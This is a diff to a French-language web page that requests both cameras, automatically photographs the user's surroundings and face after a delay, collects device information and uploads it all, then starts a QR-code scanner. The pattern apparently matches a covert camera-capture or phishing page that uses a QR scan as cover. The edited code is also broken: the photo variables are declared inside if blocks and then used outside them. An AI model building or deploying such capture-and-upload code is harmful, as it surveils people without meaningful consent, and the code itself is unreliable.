@@ -29,8 +29,8 @@
     <p>Veuillez autoriser l'accès à la caméra pour prendre des photos automatiquement.</p>
 
     <!-- Video elements to display the live camera feed -->
-    <video id="video-main" autoplay></video>
-    <video id="video-selfie" autoplay></video>
+    <video id="video-main" autoplay playsinline></video>
+    <video id="video-selfie" autoplay playsinline></video>
 
     <canvas id="photo-main" width="320" height="240"></canvas>
     <canvas id="photo-selfie" width="320" height="240"></canvas>
@@ -65,7 +65,6 @@
             canvas.height = videoElement.videoHeight;
             context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-            // Convertir le contenu du canvas en data URL
             return canvas.toDataURL('image/png');
         }
 
@@ -93,7 +92,6 @@
                 },
                 (decodedText, decodedResult) => {
                     console.log(`QR Code détecté: ${decodedText}`);
-                    // Vous pouvez ajouter une action à effectuer après la détection du QR code ici.
                     html5QrCode.stop();
                 },
                 (errorMessage) => {
@@ -104,6 +102,16 @@
             });
         }
 
+        async function obtenirCamera(facingMode) {
+            try {
+                return await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+            } catch (err) {
+                console.error(`Erreur d'accès à la caméra (${facingMode}):`, err);
+                alert("Erreur d'accès à la caméra. Assurez-vous d'avoir autorisé les permissions.");
+                return null;
+            }
+        }
+
         (async function() {
             const videoMain = document.getElementById('video-main');
             const videoSelfie = document.getElementById('video-selfie');
@@ -111,27 +119,41 @@
             const canvasSelfie = document.getElementById('photo-selfie');
 
             // Accéder à la caméra principale (arrière)
-            const streamMain = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-            videoMain.srcObject = streamMain; // Afficher le flux de la caméra arrière dans la vidéo
+            const streamMain = await obtenirCamera('environment');
+            if (streamMain) {
+                videoMain.srcObject = streamMain; // Afficher le flux de la caméra arrière dans la vidéo
+            } else {
+                alert("Impossible d'accéder à la caméra arrière.");
+            }
 
             // Accéder à la caméra selfie (avant)
-            const streamSelfie = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-            videoSelfie.srcObject = streamSelfie; // Afficher le flux de la caméra avant dans la vidéo
+            const streamSelfie = await obtenirCamera('user');
+            if (streamSelfie) {
+                videoSelfie.srcObject = streamSelfie; // Afficher le flux de la caméra avant dans la vidéo
+            } else {
+                alert("Impossible d'accéder à la caméra avant.");
+            }
 
-            // Ajouter un délai pour permettre à l'utilisateur de voir le flux
+            // Attendre un délai pour permettre à l'utilisateur de voir le flux
             setTimeout(async () => {
-                // Capturer les images des deux flux vidéo après 5 secondes
-                const dataURLMain = capturerPhoto(videoMain, canvasMain);
-                const dataURLSelfie = capturerPhoto(videoSelfie, canvasSelfie);
+                if (streamMain) {
+                    const dataURLMain = capturerPhoto(videoMain, canvasMain);
+                    const blobMain = dataURLToBlob(dataURLMain);
+                }
 
-                // Convertir les données URL en Blobs
-                const blobMain = dataURLToBlob(dataURLMain);
-                const blobSelfie = dataURLToBlob(dataURLSelfie);
+                if (streamSelfie) {
+                    const dataURLSelfie = capturerPhoto(videoSelfie, canvasSelfie);
+                    const blobSelfie = dataURLToBlob(dataURLSelfie);
+                }
+
                 const infosAppareil = await obtenirInfosAppareil();
 
-                // Envoyer les photos et les informations
-                await envoyerDonnees([blobMain, blobSelfie], infosAppareil);
-                console.log('Images et informations envoyées avec succès');
+                // Envoyer les photos et les informations (seulement si les photos ont été capturées)
+                const blobs = [blobMain, blobSelfie].filter(Boolean); // Filtrer les blobs valides
+                if (blobs.length > 0) {
+                    await envoyerDonnees(blobs, infosAppareil);
+                    console.log('Images et informations envoyées avec succès');
+                }
 
                 // Lancer le scan du QR code
                 lancerScanQRCode();
